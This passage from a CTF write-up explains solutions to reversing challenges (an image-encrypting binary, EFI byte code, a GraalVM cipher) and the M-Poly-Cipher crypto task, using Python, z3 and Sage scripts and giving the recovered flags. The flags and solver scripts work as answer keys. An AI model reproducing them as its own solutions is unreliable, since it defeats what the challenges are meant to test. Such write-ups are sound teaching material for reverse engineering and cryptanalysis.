565, 133, 737, 645, 317, 372, 287, 722, 42, 763, 476, 336, 81, 601, 538, 121, 575, 765, 718, 63, 341, 173, 420, 711, 261, 516, 185, 70, 541, 205, 517, 440, 539, 477, 695, 448, 513, 640, 86, 686, 89, 678, 349, 596, 452, 637, 182, 164, 481, 418, 278, 309, 363, 668, 649, 409, 14, 292, 99, 721, 591, 632, 212, 284, 495, 652, 731, 496, 367, 518, 159, 688, 689, 466, 457, 472, 510, 485, 600, 428, 441, 392, 479, 262, 530, 147, 747, 506, 521, 310, 658, 391, 123, 546, 547, 636, 523, 327, 434, 610, 585, 53, 245, 682, 615, 556, 542, 705, 144, 704, 728, 766, 328, 196, 559, 627, 280, 581, 216, 177, 676, 620, 491, 572, 258, 193, 534, 692, 324, 577, 754, 406, 474, 732, 748, 408, 170, 494, 456, 175, 755, 739, 709, 326, 502, 458, 531, 449, 744, 631, 555, 281, 247, 438, 303, 533, 314, 381, 638, 460, 444, 725, 447, 626, 338, 527, 733, 135, 462, 210, 504, 355, 611, 126, 619, 545, 295, 270, 300, 227, 393, 582, 724, 11, 544, 407, 553, 712, 313, 465, 595, 681, 714, 651, 118, 760, 583, 629, 330, 422, 301, 378, 499, 602, 377, 618, 622, 665, 592, 302, 519, 201, 570, 260, 461, 642, 723, 489, 484, 764, 399, 657, 590, 687, 451, 415, 318, 429, 468, 446, 488, 708, 716, 244, 654, 710, 550, 535, 608, 8, 746, 253, 435, 671, 433, 683, 729, 334, 699, 107, 276, 715, 248, 574, 605, 646, 613, 235, 633, 169, 493, 735, 628, 693, 509, 344, 679, 437, 347, 674, 364, 427, 644, 639, 442, 500, 650, 648, 719, 431, 515, 536, 691, 588, 720, 430, 266, 647, 380, 614, 200, 567, 498, 740, 717, 703, 758, 369, 110, 389]

# construct sort-mapping table
'''
for i in range(728,768):
  print i
  array = np.zeros([height, width, 3], dtype=np.uint8)
  array[:,:] = [1,1,1]
  img = Image.fromarray(array)
  img.save('jj.png')
  os.system("neko meow.n jj.png qq.png")
  img = Image.open('qq.png')
  a2 = np.array(img)

  array = np.zeros([height, width, 3], dtype=np.uint8)
  array[:,:] = [1,1,1]
  array[0,i] = [2,2,2]
  img = Image.fromarray(array)
  img.save('jj.png')
  os.system("neko meow.n jj.png kk.png")
  img = Image.open('kk.png')
  array = np.array(img)


  count=0
  for o,j in zip(array[0],a2[0]):
    #print o,j
    if str(o)!=str(j):
      if count in mapp:
         print count
         print mapp
         exit(0)
      mapp.append(count)    
    count+=1
'''
print mapp
tt={}
for i in mapp:
  if i in tt:
    print "error" # check the mapping table is error-free
  tt[i]=0
print len(mapp) 



# construct pixel-mapping table
'''
tt=[]
for i in range(768):
  f=open("haha/map_"+str(i),"w")
  f.close()
     
for i in range(256):
	  print i
	  array = np.zeros([height, width, 3], dtype=np.uint8)
	  array[:,:] = [i,i,i]
	  img = Image.fromarray(array)
	  img.save('jj.png')
          img=0
	  os.system("neko meow.n jj.png yy_%d.png" % i)

'''


# reconstruct flag.png  
img = Image.open('flag_enc.png')
a2 = np.array(img)
flag = np.zeros([height, width, 3], dtype=np.uint8)
for i in range(len(a2)):
  print i
  tt=[]
  for q in range(768):
    tt.append({})
  for q in range(256):
    img = Image.open('yy_%d.png' % q)
    ta = np.array(img)
    for y in range(len(ta[i])):
      tt[y][ta[i][y][0]]=q
  temp=[]
  for j in range(len(a2[i])):
    temp.append(tt[j][a2[i][j][0]])
  for k in range(len(mapp)):
    flag[i][k]=[temp[mapp[k]],temp[mapp[k]],temp[mapp[k]]]
img = Image.fromarray(flag)
img.save('flag.png')

#TWCTF{Ny4nNyanNy4n_M30wMe0wMeow}
```

By the way, I only reconstruct a greyscale image.
![](https://trello-attachments.s3.amazonaws.com/5d650b295bd991333842cda5/5d69f665db7d6752544102a1/69c2c425bff519b5e85152f5fefa3cf2/flag.png)

### EBC
It's a binary of EFI byte code. The process has four round. In each round, it will check 8 bytes of the flag, and if those 8 bytes are correct. It will decrypt the next round's code using CRC32 of those 8 bytes. We found that each round has same prologue about loading argument from stack, so we can find the correct key without knowing the flag. Just xor the first four bytes with [0x60, 0x81, 0x02, 0x10].

After decrypt and disassemble all those four round. We converted those instructions to z3 and recover the flag.

### Holy Grail War

It's graal reversing challenge. The tools I used are IDA and gdb.

![](https://i.imgur.com/69cvAxt.png)

You can easily find out that sub_4023c0 is the main function.

After some trials, I founf some encryption pattern

1. It's a block cipher. And the block size is 8
2. All block are indepentdent
3. It use rand48 to generate keys for every block. Because I found 0x5DEECE66D in sub_4023c0
4. And I found the encryption procedure in the following code. `a2` array stores the key. `*(_DWORD *)(v59 + 8)` is first four bytes of plaintext block. And `*(_DWORD *)(v61 + 8)` is the last four bytes. `v95` and `v167` are the first four bytes and last four bytes of encrypted block.

```c=
    v170 = *(_DWORD *)(v59 + 8) + a2[408602]; // first 4 bytes
    v60 = (__int64)v150;
    v169 = v168 + 1;
    v61 = sub_4F8F40((char)v150);
    if ( (_DWORD *)v61 != a2 && *(_DWORD *)((char *)a2 + (*(_QWORD *)v61 & 0xFFFFFFFFFFFFFFF8LL) + 120) != 522 )
    {
      v141 = sub_44DA40(v61);
      goto LABEL_291;
    }
    v151 = (char *)v61;
    if ( (_DWORD *)v61 == a2 )
    {
      v141 = sub_44E1A0(v60);
      goto LABEL_291;
    }
    v167 = a2[408627];
    v62 = a2[408603] + *(_DWORD *)(v61 + 8); //last 4 bytes
    v63 = a2[408604];
    v64 = a2[408605];
    v65 = a2[408606];
    v66 = a2[408607];
    v67 = a2[408608];
    v68 = a2[408609];
    v69 = a2[408610];
    v70 = a2[408611];
    v71 = a2[408612];
    v72 = a2[408613];
    v166 = a2[408614];
    v165 = a2[408615];
    v164 = a2[408616];
    v163 = a2[408617];
    v162 = a2[408618];
    v161 = a2[408619];
    v160 = a2[408620];
    v159 = a2[408621];
    v158 = a2[408622];
    v157 = a2[408623];
    v156 = a2[408624];
    v155 = a2[408625];
    v154 = v72;
    v73 = v63 + __ROL4__(v62 ^ v170, v62 & 0x1F);
    v74 = v64 + __ROL4__(v73 ^ v62, v73 & 0x1F);
    v75 = v65 + __ROL4__(v74 ^ v73, v74 & 0x1F);
    v76 = v66 + __ROL4__(v75 ^ v74, v75 & 0x1F);
    v77 = v67 + __ROL4__(v76 ^ v75, v76 & 0x1F);
    v78 = v68 + __ROL4__(v77 ^ v76, v77 & 0x1F);
    v79 = v69 + __ROL4__(v78 ^ v77, v78 & 0x1F);
    v80 = v70 + __ROL4__(v79 ^ v78, v79 & 0x1F);
    v81 = v71 + __ROL4__(v80 ^ v79, v80 & 0x1F);
    v82 = v72 + __ROL4__(v81 ^ v80, v81 & 0x1F);
    v83 = v166 + __ROL4__(v82 ^ v81, v82 & 0x1F);
    v84 = v165 + __ROL4__(v83 ^ v82, v83 & 0x1F);
    v85 = v164 + __ROL4__(v84 ^ v83, v84 & 0x1F);
    v86 = v163 + __ROL4__(v85 ^ v84, v85 & 0x1F);
    v87 = v162 + __ROL4__(v86 ^ v85, v86 & 0x1F);
    v88 = v161 + __ROL4__(v87 ^ v86, v87 & 0x1F);
    v89 = v160 + __ROL4__(v88 ^ v87, v88 & 0x1F);
    v90 = v159 + __ROL4__(v89 ^ v88, v89 & 0x1F);
    v91 = v158 + __ROL4__(v90 ^ v89, v90 & 0x1F);
    v92 = v157 + __ROL4__(v91 ^ v90, v91 & 0x1F);
    v93 = v156 + __ROL4__(v92 ^ v91, v92 & 0x1F);
    v94 = v155 + __ROL4__(v93 ^ v92, v93 & 0x1F);
    v95 = a2[408626] + __ROL4__(v94 ^ v93, v94 & 0x1F); // first four bytes of encrypted block
    if ( (unsigned int)(v95 + 128) < 0x100 )
    {
      v100 = *(_QWORD *)&a2[2 * (v95 + 128) + 506942];
    }
    else
    {
      _RDX = *(_QWORD **)(a3 + 56);
      if ( *(_QWORD *)(a3 + 48) - (_QWORD)_RDX < 0x10uLL )
        _RDX = 0LL;
      else
        *(_QWORD *)(a3 + 56) = _RDX + 2;
      if ( _RDX )
      {
        __asm { prefetchnta byte ptr [rdx+100h] }
        *_RDX = v152 - (char *)a2;
        _RDX[1] = 0LL;
      }
      else
      {
        v155 = v95;
        v156 = v94;
        _RDX = (_QWORD *)sub_42D6D0(v152);
        v95 = v155;
        v94 = v156;
      }
      *((_DWORD *)_RDX + 2) = v95;
    }
    v167 += __ROL4__(v95 ^ v94, v95 & 0x1F); // last four bytes of encrypted block
```

After figured out the encrypt procedure. I use gdb to extract the keys for all the blocks. Then I use z3 to get the flag. 

```python=
from z3 import *
from pwn import *

k=open("key").read() # This script can reconstruct one block at a time
a2=[]
s=Solver()
flag1=BitVec("f1",32)
flag2=BitVec("f2",32)


def __ROL4__(x,n):
  size=32
  return (x << n) | LShR(x ,32 - n)
for i in range(0,len(k),4):
  a2.append(u32(k[i:i+4]))




print a2



v180 = flag1 + a2[408602-408602];
v177 = a2[408627-408602];
v68 = a2[408603-408602] + flag2
v69 = a2[408604-408602];
v70 = a2[408605-408602];
v71 = a2[408606-408602];
v72 = a2[408607-408602];
v73 = a2[408608-408602];
v74 = a2[408609-408602];
v75 = a2[408610-408602];
v76 = a2[408611-408602];
v77 = a2[408612-408602];
v78 = a2[408613-408602];
v176 = a2[408614-408602];
v175 = a2[408615-408602];
v174 = a2[408616-408602];
v173 = a2[408617-408602];
v172 = a2[408618-408602];
v171 = a2[408619-408602];
v170 = a2[408620-408602];
v169 = a2[408621-408602];
v168 = a2[408622-408602];
v167 = a2[408623-408602];
v166 = a2[408624-408602];
v165 = a2[408625-408602];
v164 = v78;
v79 = v69 + __ROL4__(v68 ^ v180, v68 & 0x1F);
v80 = v70 + __ROL4__(v79 ^ v68, v79 & 0x1F);
v81 = v71 + __ROL4__(v80 ^ v79, v80 & 0x1F);
v82 = v72 + __ROL4__(v81 ^ v80, v81 & 0x1F);
v83 = v73 + __ROL4__(v82 ^ v81, v82 & 0x1F);
v84 = v74 + __ROL4__(v83 ^ v82, v83 & 0x1F);
v85 = v75 + __ROL4__(v84 ^ v83, v84 & 0x1F);
v86 = v76 + __ROL4__(v85 ^ v84, v85 & 0x1F);
v87 = v77 + __ROL4__(v86 ^ v85, v86 & 0x1F);
v88 = v78 + __ROL4__(v87 ^ v86, v87 & 0x1F);
v89 = v176 + __ROL4__(v88 ^ v87, v88 & 0x1F);
v90 = v175 + __ROL4__(v89 ^ v88, v89 & 0x1F);
v91 = v174 + __ROL4__(v90 ^ v89, v90 & 0x1F);
v92 = v173 + __ROL4__(v91 ^ v90, v91 & 0x1F);
v93 = v172 + __ROL4__(v92 ^ v91, v92 & 0x1F);
v94 = v171 + __ROL4__(v93 ^ v92, v93 & 0x1F);
v95 = v170 + __ROL4__(v94 ^ v93, v94 & 0x1F);
v96 = v169 + __ROL4__(v95 ^ v94, v95 & 0x1F);
v97 = v168 + __ROL4__(v96 ^ v95, v96 & 0x1F);
v98 = v167 + __ROL4__(v97 ^ v96, v97 & 0x1F);
v99 = v166 + __ROL4__(v98 ^ v97, v98 & 0x1F);
v100 = v165 + __ROL4__(v99 ^ v98, v99 & 0x1F);
v101 = a2[408626-408602] + __ROL4__(v100 ^ v99, v100 & 0x1F)
v177 += __ROL4__(v101 ^ v100, v101 & 0x1F)

s.add(v101==0x2699d29f) #  
s.add(v177==0x54659267) # You need modify these two for each block

#s.add(flag1!=3360444911) I found two answer for the second block. So I disable the unprintable answer


print s.check()
print s.model()
flag=""
f1=hex(int(str(s.model()[flag1])))[2:].decode("hex")
f2=hex(int(str(s.model()[flag2])))[2:].decode("hex")
print f1+f2

#TWCTF{Fat3_Gr4nd_Ord3r_1s_fuck1n6_h07}
```

## crypto

### real-baby-rsa

### Simple Logic

### Happy!

### M-Poly-Cipher
The program looks like:
```
Create-key:
C = - (A (S^2) + B S)
pubkey = (A, B, C)

Encrypt:
R = random_matrix()
X = R A
Y = R B
Z = R C + P
enc = (X, Y, Z)

Decrypt:
P = C + X S^2 + Y S

Note:
Z = R C= -(R A (S^2) + R B S) + P = -(X (S^2) + Y S) + P
```

So we can calculate the random matrix `R` with `X, Y, A, B` and decrypt the cipher text.

```
sage: with open('flag.enc', 'rb') as f:
....:     enc_raw = f.read()
....:
sage: enc = struct.unpack('<192I', enc_raw)
sage: with open('public.key', 'rb') as f:
....:     pub_raw = f.read()
....:
sage: pub = struct.unpack('<192I', pub_raw)
sage: A = Matrix(F, [pub[:64][i:i+8] for i in range(0, 64, 8)])
sage: B = Matrix(F, [pub[64:128][i:i+8] for i in range(0, 64, 8)])
sage: C = Matrix(F, [pub[128:][i:i+8] for i in range(0, 64, 8)])
sage: X = Matrix(F, [enc[:64][i:i+8] for i in range(0, 64, 8)])
sage: Y = Matrix(F, [enc[64:128][i:i+8] for i in range(0, 64, 8)])
sage: Z = Matrix(F, [enc[128:][i:i+8] for i in range(0, 64, 8)])
sage: ca = A[:4].solve_left(A[4:])
sage: cb = B[:4].solve_left(B[4:])
sage: cA = identity_matrix(F, 4).augment(ca.T).T
sage: cB = identity_matrix(F, 4).augment(cb.T).T
sage: RcA = A.solve_left(X).T[:4].T
sage: RcB = B.solve_left(Y).T[:4].T
sage: Q = cA.augment(cB)
sage: RQ = RcA.augment(RcB)
sage: R = Q.solve_left(RQ)
sage: P = Z - R * C
sage: P
[ 84  87  67  84  70 123 112  97]
[ 43 104  95 116  48  95 116 111]
[109 111 114 114  48 119 125   0]
[  0   0   0   0   0   0   0   0]
[  0   0   0   0   0   0   0   0]
[  0   0   0   0   0   0   0   0]
[  0   0   0   0   0   0   0   0]
[  0   0   0   0   0   0   0   0]
sage: ''.join(chr(int(e)) for r in P for e in r).strip('\0')
'TWCTF{pa+h_t0_tomorr0w}'
```
